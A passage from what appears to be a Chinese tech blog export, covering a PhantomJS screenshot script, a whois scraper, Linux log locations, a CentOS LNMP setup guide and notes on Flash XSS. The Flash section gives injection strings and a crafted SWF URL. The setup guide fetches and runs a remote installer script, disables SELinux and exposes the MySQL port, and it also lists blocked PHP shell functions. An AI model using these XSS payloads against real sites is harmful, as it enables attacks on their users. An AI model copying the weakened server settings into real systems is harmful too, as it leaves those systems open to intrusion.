class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> page = <span class=\"built_in\">require</span>(<span class=\"string\">'webpage'</span>).create(),</span><br><span class=\"line\">    address, output, size;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (phantom.args.length &lt; <span class=\"number\">2</span> || phantom.args.length &gt; <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'Usage: rasterize.js URL filename [paperwidth*paperheight|paperformat]'</span>);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'  paper (pdf output) examples: \"5in*7.5in\", \"10cm*20cm\", \"A4\", \"Letter\"'</span>);</span><br><span class=\"line\">    phantom.exit();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    address = phantom.args[<span class=\"number\">0</span>];</span><br><span class=\"line\">    output = phantom.args[<span class=\"number\">1</span>];</span><br><span class=\"line\">    page.viewportSize = &#123; width: <span class=\"number\">600</span>, height: <span class=\"number\">600</span> &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (phantom.args.length === <span class=\"number\">3</span> &amp;&amp; phantom.args[<span class=\"number\">1</span>].substr(-<span class=\"number\">4</span>) === <span class=\"string\">\".pdf\"</span>) &#123;</span><br><span class=\"line\">        size = phantom.args[<span class=\"number\">2</span>].split(<span class=\"string\">'*'</span>);</span><br><span class=\"line\">        page.paperSize = size.length === <span class=\"number\">2</span> ? &#123; width: size[<span class=\"number\">0</span>], height: size[<span class=\"number\">1</span>], border: <span class=\"string\">'0px'</span> &#125;</span><br><span class=\"line\">                                           : &#123; format: phantom.args[<span class=\"number\">2</span>], orientation: <span class=\"string\">'portrait'</span>, border: <span class=\"string\">'1cm'</span> &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    page.open(address, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(status)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (status !== <span class=\"string\">'success'</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">'Unable to load the address!'</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">window</span>.setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                page.render(output);</span><br><span class=\"line\">                phantom.exit();</span><br><span class=\"line\">            &#125;, <span class=\"number\">200</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>写成python版本什么的就直接写个脚本在命令行下调用phantomjs生成图片就好了，由于速度差强人意，就没去写，可能是我姿势不对把</p>\n<h3 id=\"phantomjs实现页面爬虫\">phantomjs实现页面爬虫</h3><p>这里还是以<a href=\"http://whois.www.net.cn\" target=\"_blank\" rel=\"external\">万网whois查询</a>为例，直接给出源代码，不啰嗦</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\">#coding: utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"></span><br><span class=\"line\">driver = webdriver.PhantomJS(executable_path=<span class=\"string\">'/usr/bin/phantomjs'</span>)  <span class=\"comment\">#这里指定phatomjs可执行文件的位置</span></span><br><span class=\"line\">driver.get(<span class=\"string\">\"http://whois.www.net.cn/whois/domain/baidu.com\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#print driver.page_source</span></span><br><span class=\"line\"><span class=\"comment\">#print dir(driver)</span></span><br><span class=\"line\">regOrg = driver.find_element_by_id(<span class=\"string\">'info_registrantOrganization'</span>).text</span><br><span class=\"line\"><span class=\"keyword\">print</span> regOrg</span><br><span class=\"line\">regEmail = driver.find_element_by_id(<span class=\"string\">'info_registrantEmail'</span>).text</span><br><span class=\"line\"><span class=\"keyword\">print</span> regEmail</span><br><span class=\"line\">regSpon = driver.find_element_by_css_selector(<span class=\"string\">'tbody tr:nth-child(7) td:last-child'</span>).text</span><br><span class=\"line\"><span class=\"keyword\">print</span> regSpon</span><br><span class=\"line\">regFromTime = driver.find_element_by_css_selector(<span class=\"string\">'tbody tr:nth-child(10) td:last-child'</span>).text</span><br><span class=\"line\"><span class=\"keyword\">print</span> regFromTime</span><br><span class=\"line\">regToTime = driver.find_element_by_css_selector(<span class=\"string\">'tbody tr:nth-child(13) td:last-child'</span>).text</span><br><span class=\"line\"><span class=\"keyword\">print</span> regToTime</span><br><span class=\"line\">regNameServer = driver.find_element_by_css_selector(<span class=\"string\">'tbody tr:nth-child(19) td:last-child'</span>).text</span><br><span class=\"line\"><span class=\"keyword\">print</span> regNameServer</span><br><span class=\"line\">infowhoisfull = driver.find_element_by_id(<span class=\"string\">'info_whois_full'</span>).text</span><br><span class=\"line\"><span class=\"keyword\">print</span> infowhoisfull</span><br><span class=\"line\">driver.quit</span><br></pre></td></tr></table></figure>\n<p>写了半天的程序，万网竟然不给批量爬，气死了我。。。抑郁而终！</p>\n"},{"title":"Linux日志文件","url":"http://ohroot.com/2014/11/03/Linux日志文件/","content":"<p>这天，我在Linux下发现有一个服务停止不了了，完全不知道该怎么办，我觉得学习下Linux下日志文件，然后看看日志文件应该能解决问题。<br><a id=\"more\"></a></p>\n<h2 id=\"常见的日志文件名\">常见的日志文件名</h2><ul>\n<li>/var/log/cron  例行性工作调度相关</li>\n<li>/var/log/dmesg  开机内核检测过程所产生的各项信息</li>\n<li>/var/log/lastlog  所有帐号最近一次登录系统所产生的各项信息</li>\n<li>/var/log/messages 系统发生的错误信息</li>\n<li>/var/log/secure 涉及到登录的操作，信息都会记录与此</li>\n<li>/var/log/wtmp /var/log/faillog 登录成功与未成功的账户信息</li>\n</ul>\n<h2 id=\"linux_Web相关日志：\">linux Web相关日志：</h2><p>apache日志：/var/log/apache2<br>ngnix日志：/var/log/ngnix<br>mysql日志：<br>可通过配置文件修改：/etc/mysql/my.cnf<br>将下面两行的#去掉<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"id\">#general_log_file</span> = /var/log/mysql/mysql<span class=\"class\">.log</span></span><br><span class=\"line\"><span class=\"id\">#general_log</span> = <span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<p>操作日志：history命令和.bash_history文件<br>登陆日志：lastlog</p>\n<h2 id=\"附：Windows_相关日志：\">附：Windows 相关日志：</h2><p>添加用户日志：1.计算机——管理——事件查看器——windows日志——安全<br>wamp日志：wamp—-logs和apache—-logs<br>mysql日志：mysql日志为二进制文件<br>mysqlbinlog ../data/mysql-bin.000001 mysql只能看到非select的操作</p>\n"},{"title":"CentOS 6.5安装配置LNMP服务器(Nginx+PHP+MySQL)","url":"http://ohroot.com/2014/11/03/CentOS-6-5-安装配置LNMP服务器-Nginx-PHP-MySQL/","content":"<p>CentOS下搭建LNMP服务器，实践后做个笔记。<br><a id=\"more\"></a></p>\n<h2 id=\"准备篇\">准备篇</h2><h3 id=\"配置防火墙，开启80端口、3306端口\">配置防火墙，开启80端口、3306端口</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/sysconfig/iptables</span><br><span class=\"line\">-A INPUT -m state --state NEW -m tcp -p tcp --dport <span class=\"number\">80</span> -j ACCEPT <span class=\"comment\">#允许80端口通过防火墙</span></span><br><span class=\"line\">-A INPUT -m state --state NEW -m tcp -p tcp --dport <span class=\"number\">3306</span> -j ACCEPT <span class=\"comment\">#允许3306端口通过防火墙</span></span><br></pre></td></tr></table></figure>\n<p><code>/etc/init.d/iptables restart #最后重启防火墙使配置生效</code></p>\n<h3 id=\"关闭SELINUX\">关闭SELINUX</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/selinux/config</span><br><span class=\"line\"><span class=\"comment\">#SELINUX=enforcing #注释掉</span></span><br><span class=\"line\"><span class=\"comment\">#SELINUXTYPE=targeted #注释掉</span></span><br><span class=\"line\">SELINUX=disabled <span class=\"comment\">#增加</span></span><br><span class=\"line\">:wq <span class=\"comment\">#保存退出</span></span><br></pre></td></tr></table></figure>\n<p><code>shutdown -r now #重启系统</code></p>\n<h3 id=\"安装第三方yum源\">安装第三方yum源</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://www.atomicorp.com/installers/atomic <span class=\"comment\">#下载</span></span><br><span class=\"line\">sh ./atomic <span class=\"comment\">#安装</span></span><br><span class=\"line\">yum check-update <span class=\"comment\">#更新yum源</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"安装篇\">安装篇</h2><h3 id=\"安装nginx\">安装nginx</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum remove httpd* php* <span class=\"comment\">#删除系统自带的软件包</span></span><br><span class=\"line\">yum install nginx <span class=\"comment\">#安装nginx 根据提示输入y进行安装</span></span><br><span class=\"line\">chkconfig nginx on <span class=\"comment\">#设置nginx开机启动</span></span><br><span class=\"line\">service nginx start <span class=\"comment\">#启动nginx</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"安装MySQL\">安装MySQL</h3><ul>\n<li><p>安装MySQL</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install mysql mysql-server <span class=\"comment\">#输入Y即可自动安装,直到安装完成</span></span><br><span class=\"line\">/etc/init.d/mysqld start <span class=\"comment\">#启动MySQL</span></span><br><span class=\"line\">chkconfig mysqld on <span class=\"comment\">#设为开机启动</span></span><br><span class=\"line\">cp /usr/share/mysql/my-medium.cnf /etc/my.cnf <span class=\"comment\">#拷贝配置文件（注意：如果/etc目录下面默认有一个my.cnf，直接覆盖即可）</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>为root账户设置密码</p>\n</li>\n</ul>\n<p><code>mysql_secure_installation</code>  回车，根据提示输入Y，输入2次密码，回车，根据提示一路输入Y，最后出现：Thanks for using MySQL!<br>MySql密码设置完成，重新启动 MySQL：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/mysqld restart <span class=\"comment\">#重启</span></span><br><span class=\"line\">/etc/init.d/mysqld stop <span class=\"comment\">#停止</span></span><br><span class=\"line\">/etc/init.d/mysqld start <span class=\"comment\">#启动</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"安装PHP5\">安装PHP5</h3><ul>\n<li><p>安装PHP5<br><code>yum install php php-fpm #根据提示输入Y直到安装完成</code></p>\n</li>\n<li><p>安装PHP组件，使PHP5支持MySQL<br><code>yum install php-mysql php-gd libjpeg* php-imap php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-mcrypt php-bcmath php-mhash libmcrypt  #这里选择以上安装包进行安装，根据提示输入Y回车</code><br><code>chkconfig php-fpm on #设置php-fpm开机启动</code><br><code>/etc/init.d/php-fpm start #启动php-fpm</code></p>\n</li>\n</ul>\n<h2 id=\"配置篇\">配置篇</h2><ul>\n<li>配置nginx支持php<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /etc/nginx/nginx.conf /etc/nginx/nginx.confbak  <span class=\"comment\">#备份原有配置文件</span></span><br><span class=\"line\">vi /etc/nginx/nginx.conf  <span class=\"comment\">#编辑</span></span><br><span class=\"line\">user nginx nginx; <span class=\"comment\">#修改nginx运行账号为：nginx组的nginx用户</span></span><br><span class=\"line\">:wq <span class=\"comment\">#保存退出</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/default.confbak <span class=\"comment\">#备份原有配置文件</span></span><br><span class=\"line\">vi /etc/nginx/conf.d/default.conf <span class=\"comment\">#编辑</span></span><br><span class=\"line\">index index.php index.html index.htm; <span class=\"comment\">#增加index.php</span></span><br><span class=\"line\"><span class=\"comment\"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">location ~ \\.php$ &#123;</span><br><span class=\"line\">root html;</span><br><span class=\"line\">fastcgi_pass <span class=\"number\">127.0</span>.<span class=\"number\">0.1</span>:<span class=\"number\">9000</span>;</span><br><span class=\"line\">fastcgi_index index.php;</span><br><span class=\"line\">fastcgi_param SCRIPT_FILENAME <span class=\"variable\">$document_root</span><span class=\"variable\">$fastcgi_script_name</span>;</span><br><span class=\"line\">include fastcgi_params;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">#取消FastCGI server部分location的注释,并要注意fastcgi_param行的参数,改为$document_root$fastcgi_script_name,或者使用绝对路径</span></span><br></pre></td></tr></table></figure>\n<p><code>service nginx restart</code> #重启nginx</p>\n<ul>\n<li>php配置</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/php.ini <span class=\"comment\">#编辑</span></span><br><span class=\"line\"></span><br><span class=\"line\">date.timezone = PRC <span class=\"comment\">#把前面的分号去掉，改为date.timezone = PRC</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">disable</span>_<span class=\"built_in\">functions</span> = passthru,<span class=\"built_in\">exec</span>,system,chroot,scandir,chgrp,chown,shell_<span class=\"built_in\">exec</span>,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,escapeshellcmd,dll,popen,disk_free_space,checkdnsrr,checkdnsrr,getservbyname,getservbyport,disk_total_space,posix_ctermid,posix_get_last_error,posix_getcwd,posix_getegid,posix_geteuid,posix_getgid,posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_getpwnam,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty,posix_<span class=\"built_in\">kill</span>,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_<span class=\"built_in\">times</span>,posix_ttyname,posix_uname</span><br><span class=\"line\"><span class=\"comment\">#在386行 列出PHP可以禁用的函数，如果某些程序需要用到这个函数，可以删除，取消禁用。</span></span><br><span class=\"line\"></span><br><span class=\"line\">expose_php = Off <span class=\"comment\">#禁止显示php版本的信息</span></span><br><span class=\"line\"></span><br><span class=\"line\">short_open_tag = ON <span class=\"comment\">#支持php短标签</span></span><br><span class=\"line\"></span><br><span class=\"line\">open_basedir = 网站根目录:/tmp/</span><br><span class=\"line\"><span class=\"comment\">#设置表示允许访问当前目录(即PHP脚本文件所在之目录)和/tmp/目录;冒号为分隔符。</span></span><br><span class=\"line\"></span><br><span class=\"line\">:wq! <span class=\"comment\">#保存退出</span></span><br></pre></td></tr></table></figure>\n<p>open_basedir配置选项中有些教程会配置为<code>open_basedir=.:/tmp/</code>，其中’.’代表当前目录。这种方式在nginx+phpfastcgi下好像行不通。</p>\n<ul>\n<li>配置php-fpm<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /etc/php-fpm.d/www.conf /etc/php-fpm.d/www.confbak <span class=\"comment\">#备份原有配置文件</span></span><br><span class=\"line\">vi /etc/php-fpm.d/www.conf  <span class=\"comment\">#编辑</span></span><br><span class=\"line\">user = nginx <span class=\"comment\">#修改用户为nginx</span></span><br><span class=\"line\">group = nginx <span class=\"comment\">#修改组为nginx</span></span><br><span class=\"line\">:wq <span class=\"comment\">#保存退出</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"测试篇\">测试篇</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /usr/share/nginx/html</span><br><span class=\"line\">vi index.php <span class=\"comment\">#添加以下代码</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">phpinfo();</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">:wq! <span class=\"comment\">#保存退出</span></span><br><span class=\"line\"></span><br><span class=\"line\">chown nginx.nginx /usr/share/nginx/html -R <span class=\"comment\">#设置权限</span></span><br><span class=\"line\">service nginx restart <span class=\"comment\">#重启nginx</span></span><br><span class=\"line\">service php-fpm restart <span class=\"comment\">#重启php-fpm</span></span><br></pre></td></tr></table></figure>\n<p>在客户端浏览器输入服务器IP地址，可以看到相关的配置信息！说明lnmp配置成功！</p>\n<p>至此，CnetOS 6.5安装配置LNMP（Nginx+PHP+MySQL）教程完成。</p>\n"},{"title":"FlashXSS学习","url":"http://ohroot.com/2014/10/17/FlashXSS学习/","content":"<p>入门Flash XSS。。。<br><a id=\"more\"></a><br>Flash 反编译软件：Action Script Viewer</p>\n<h2 id=\"页面嵌入Flash\">页面嵌入Flash</h2><p>在HTML中嵌入FLASH的时候在IE和非IE浏览器下嵌入的方式有所不同，可以使用embed标签和object标签，使用如下的代码进行嵌入：<br>IE下嵌入<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">object</span> <span class=\"attribute\">codeBase</span>=<span class=\"value\">\"http://fpdownload.macromedia.com/get/Flashplayer/current/swFlash.cab#version=8,0,0,0\"</span> <span class=\"attribute\">classid</span>=<span class=\"value\">\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">param</span> <span class=\"attribute\">name</span>=<span class=\"value\">\"movie\"</span> <span class=\"attribute\">value</span> = \"<span class=\"attribute\">http:</span>//<span class=\"attribute\">xxxx.sinaapp.com</span>/<span class=\"attribute\">trace.swf</span>\" /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">param</span> <span class=\"attribute\">name</span>=<span class=\"value\">\"allowScriptAccess\"</span> <span class=\"attribute\">value</span>=<span class=\"value\">\"always\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">param</span> <span class=\"attribute\">name</span>=<span class=\"value\">\"allowNetworking\"</span> <span class=\"attribute\">value</span>=<span class=\"value\">\"all\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">object</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>非IE下嵌入<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">object</span> <span class=\"attribute\">type</span>=<span class=\"value\">\"application/x-shockwave-Flash\"</span> <span class=\"attribute\">data</span>=<span class=\"value\">\"./trace.swf\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">param</span> <span class=\"attribute\">name</span>=<span class=\"value\">\"movie\"</span> <span class=\"attribute\">value</span> = \"<span class=\"attribute\">.</span>/<span class=\"attribute\">trace.swf</span>\" /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">param</span> <span class=\"attribute\">name</span>=<span class=\"value\">\"allowScriptAccess\"</span> <span class=\"attribute\">value</span>=<span class=\"value\">\"always\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">param</span> <span class=\"attribute\">name</span>=<span class=\"value\">\"allowNetworking\"</span> <span class=\"attribute\">value</span>=<span class=\"value\">\"all\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">object</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>在插入Flash的过程中有两个重要的参数，allowScriptAccess和allowNetworking两个参数：<br>allowScriptAccess：控制html页面与Flash页面的通讯。<br>always：html和Flash页面的通讯不做任何的限制；<br>samedomain：html和Flash同域的时候可以做通讯【这个值是默认值】；<br>never：html和Flash禁止通讯。</p>\n<p>allowNetworking：控制Flash与外部的网络通讯。<br>all：Flash所有的网络API通讯接口都可用；<br>internal：navigateToURL，fscommand，ExternalInterface.call不可用；<br>none：所有的网络API不可用。</p>\n<h2 id=\"Flash跨域请求\">Flash跨域请求</h2><p>Flash跨域访问的时候主要受到crossdomain.xml文件的影响。crossdomain.xml文件主要包含如下几个节点：<br>site-control，allow-access-from，allow-access-from-identity，allow-http-request-headers-from<br>常用的节点为allow-access-from，用来指明允许本域资源允许被哪些域名的Flash跨域请求。<br>示例crossdomain.xml文件：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">cross-domain-policy</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">allow-access-from</span> <span class=\"attribute\">domain</span>=<span class=\"value\">\"*.youku.com\"</span>/&gt;</span> //允许youku.com域名的Flash访问</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">allow-access-from</span> <span class=\"attribute\">domain</span>=<span class=\"value\">\"*.ykimg.com\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">allow-access-from</span> <span class=\"attribute\">domain</span>=<span class=\"value\">\"*.tudou.com\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"可能存在漏洞的函数\">可能存在漏洞的函数</h2><ol>\n<li><p>navigateToURL/getURL<br>点击跳转的效果<br>as3.0版本  <code>navigateToURL(newURLRequest(link),&quot;_self&quot;);</code><br>as2.0版本  <code>getURL(link,&quot;_self&quot;);</code></p>\n</li>\n<li><p>ExternalInterface.call<br>Flash与宿主页面javascript通信接口，一般两个参数，第一个参数是所调用的js函数名，后续参数为其参数</p>\n<p> 示例代码代码：ExternalInterface.call(“alert”,”1”)  =&gt;&gt; try{<strong>flash</strong>toXML(函数名(“参数1”));}catch(e){“<undefined>“;}</undefined></p>\n<ul>\n<li>当函数名可控，可写成：<code>(function(){alert(1)})</code></li>\n<li>参数可控，可构造参数闭合函数，或者闭合前面利用catch触发JS。</li>\n</ul>\n</li>\n<li><p>htmlText<br>Flash支持在Flash里内嵌html，支持的标签img标签，a标签等。 img标签可以通过src参数引入一个Flash文件，类似与XSF一样。<br>示例：</p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"preprocessor\"><span class=\"keyword\">import</span> fl.controls.TextArea;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a:String = root.loaderInfo.parameters.url</span><br><span class=\"line\"><span class=\"keyword\">var</span> t:TextArea = <span class=\"keyword\">new</span> TextArea()</span><br><span class=\"line\">t.width = <span class=\"number\">500</span></span><br><span class=\"line\">t.height = <span class=\"number\">300</span></span><br><span class=\"line\">t.htmlText += a</span><br><span class=\"line\">addChild(t)</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>利用：<code>http://127.0.0.1/htmltext.swf?url=&lt;img src=&#39;./trace.swf&#39;&gt;</code></p>\n"},{"title":"系统安装与备份","url":"http://ohroot.com/2014/10/17/系统安装与备份/","content":"<p>本文主要介绍将ubuntu系统备份成一个LiveCD的方法，做个小结。<br><a id=\"more\"></a></p>\n<p>菜鸟就是有点苦逼，装系统这种事干的太多了，于是就来总结下，希望早点告别菜鸟，特写下此文。</p>\n<p>首先，介绍烧写iso文件到U盘的方法，我一般使用的软件有两个，即UltraISO和Universal-USB-Installer，前者很强大，后者对Linux系统的iso文件的烧写比较给力。</p>\n<p>接着，就要说一下本文的重点，将现有的ubuntu系统备份成liveCD。</p>\n<p>我开始尝试的是手动方法，后来经人指导，知道了<a href=\"http://www.remastersys.com/\" target=\"_blank\" rel=\"external\">remastersys</a>,用法很简单，基本操作方法如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo remastersys backup myback.iso    <span class=\"comment\">#系统备份到myback.iso. </span></span><br><span class=\"line\">sudo remastersys dist                 <span class=\"comment\">#产生一个可发布（包含个人文档）的 livecd/dvd </span></span><br><span class=\"line\">sudo remastersys dist cdfs            <span class=\"comment\">#产生一个纯净的可发布的 livecd/dvd </span></span><br><span class=\"line\">sudo remastersys dist iso mubuntu.iso <span class=\"comment\">#产生一个可发布（包含个人文档）的 </span></span><br><span class=\"line\">sudo remastersys clean                <span class=\"comment\">#清除由 remastersys产生的临时文件</span></span><br></pre></td></tr></table></figure></p>\n<p>然后是半自动化的方法，参考文章<a href=\"http://blog.csdn.net/vah101/article/details/6117912\" target=\"_blank\" rel=\"external\">将现有Ubuntu系统做成LiveCD</a>。</p>\n<p>这里列举主要操作步骤:</p>\n<p>1.当前操作系统备份成squashfs归档文件，有很多工具，其中最简便的就数Live Ubuntu Backup V2.2了，尤其是它还支持中文提示，在<a href=\"http://forum.ubuntu.org.cn/viewtopic.php?f=21&amp;t=206287\" target=\"_blank\" rel=\"external\">http://forum.ubuntu.org.cn/viewtopic.php?f=21&amp;t=206287</a> 可以下载，并且还有使用说明。这是一个shell脚本写成的Ubuntu备份工具，直接运行即可。<br>将lub拷贝到/home下，<code>sudo chmod 777 /home/lub</code> 然后执行<code>sudo /home/lub -b</code>，然后按e或c来选择是英文提示，还是中文提示。<br>第一次执行时，可能会提示需要安装lupin-casper和squashfs-tools，其中 lupin-casper可以忽略，而squashfs-tools必须安装.<br>运行<code>sudo apt-get install 